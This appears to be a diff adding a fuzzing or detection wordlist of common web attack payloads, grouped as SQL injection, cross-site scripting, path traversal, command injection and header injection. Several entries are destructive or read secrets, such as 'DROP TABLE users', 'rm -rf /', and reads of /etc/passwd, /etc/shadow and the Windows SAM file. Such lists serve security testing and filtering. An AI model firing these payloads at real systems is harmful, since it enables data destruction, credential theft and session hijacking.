@@ -1,0 +1,38 @@
+# SQL Injection
+' OR 1=1 --
+UNION SELECT username, password FROM users
+'; DROP TABLE users; --
+admin' --
+1; SELECT * FROM information_schema.tables --
+WAITFOR DELAY '00:00:05'
+SLEEP(5)
+BENCHMARK(10000000,SHA1('test'))
+' OR '1'='1' /*
+
+# XSS
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(document.cookie)>
+javascript:alert('xss')
+<iframe src="javascript:alert(1)">
+" onfocus="alert(1)" autofocus="
+<body onload=alert('xss')>
+
+# Path Traversal
+../../etc/passwd
+..\..\windows\system32\config\sam
+../../../etc/shadow
+%2e%2e%2fetc%2fpasswd
+
+# Command Injection
+; cat /etc/passwd
+| whoami
+`id`
+$(uname -a)
+uid=0(root)
+; rm -rf /
+
+# Header Injection / Encoding
+%0d%0aSet-Cookie:hacked=true
+%c0%af..%c0%af
+%252e%252e%252fetc%252fpasswd
